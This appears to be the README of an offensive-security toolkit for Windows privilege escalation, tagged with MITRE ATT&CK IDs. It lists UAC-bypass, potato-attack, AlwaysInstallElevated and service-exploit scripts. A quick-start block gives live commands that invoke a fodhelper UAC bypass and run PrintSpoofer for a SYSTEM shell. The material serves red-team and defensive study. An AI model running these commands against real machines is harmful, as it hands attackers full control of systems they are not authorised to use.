# Windows Privilege Escalation

Techniques for escalating from standard user to Administrator or SYSTEM.

> **MITRE ATT&CK**: T1548, T1134, T1574

## Files

| File | Description |
|------|-------------|
| [`uac_bypass.ps1`](uac_bypass.ps1) | 8 UAC bypass techniques — fodhelper, eventvwr, CMSTP, sdclt, computerdefaults, slui, DiskCleanup env var, mock trusted directory. Each as a callable function (T1548.002) |
| [`potato_attacks.md`](potato_attacks.md) | Service account → SYSTEM escalation — PrintSpoofer, GodPotato, JuicyPotato, SweetPotato, RoguePotato. Decision matrix, commands, CLSIDs (T1134.001) |
| [`alwaysinstallelevated.md`](alwaysinstallelevated.md) | Detection + exploitation of AlwaysInstallElevated — msfvenom MSI, WiX manual MSI, silent install commands (T1548.002) |
| [`service_exploits.ps1`](service_exploits.ps1) | Automated scan for exploitable services — unquoted paths, writable binaries, weak DACLs, writable directories, modifiable registry keys (T1574.009-011) |

## Quick Start

```powershell
# Check UAC level and integrity
whoami /groups | findstr /i "integrity"
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Service enumeration
.\service_exploits.ps1

# UAC bypass (dot-source first)
. .\uac_bypass.ps1
Invoke-FodhelperBypass -Cmd "powershell.exe -ep bypass"

# Potato (from service account context)
PrintSpoofer.exe -i -c cmd.exe
```
